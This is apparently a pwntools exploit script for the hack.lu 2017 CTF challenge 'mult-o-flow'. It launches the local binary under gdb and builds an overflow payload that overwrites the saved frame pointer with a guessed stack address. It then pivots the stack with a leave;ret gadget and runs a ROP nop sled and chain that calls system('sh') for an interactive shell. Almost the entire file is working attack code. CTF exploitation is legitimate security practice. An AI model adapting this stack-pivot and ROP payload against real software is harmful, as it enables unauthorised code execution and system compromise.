from pwn import *
import time

# while True:
# p = process("/home/tukan/dev/hx/ctf/hacklu17/mult/mult-o-flow", aslr=True)
p = process("/home/tukan/dev/hx/ctf/hacklu17/mult/mult-o-flow", aslr=False, env={})
time.sleep(1)

commands = """
set follow-fork-mode parent
b *0x00048C52
b *0x00048882
c
"""

gdb.attach(p, gdbscript=commands)
p.sendline('a'*64)

leave_ret = 0x000486e6
# saved ebp will be overwritten by this, later ending up in esp
# environment dependent
# find candidates by search -4 0x4b124
guess = 0xffffc626

data = 'Country: testtesttest<'
data += 'ISP: ' + 'sh #'*((512+12)//4) + '\x33\x22\x11<'
data += 'B'*(4096 + 512 + 512 + 4*3 - 1 + 4*1 - len(data))
data += 'CCCC'+p32(guess)+p32(leave_ret)
usable_len = 2047*3 - len(data)
print 'filler len: ', usable_len

rop_nop = 0x00048552
call_system = 0x00048882
sh_addr = 0x4b124
rop_chain = flat([
    call_system,
    sh_addr
])
print hexdump(rop_chain)
# the upper parts of buf are messed up, create to adjacent nop sled and chain pairs
rop = (p32(rop_nop) * 52 + rop_chain) * 2
data += rop
data += 'B'*(2047*3 - len(data))

print 'data_len: ', hex(len(data))
p.sendline(data)
p.interactive()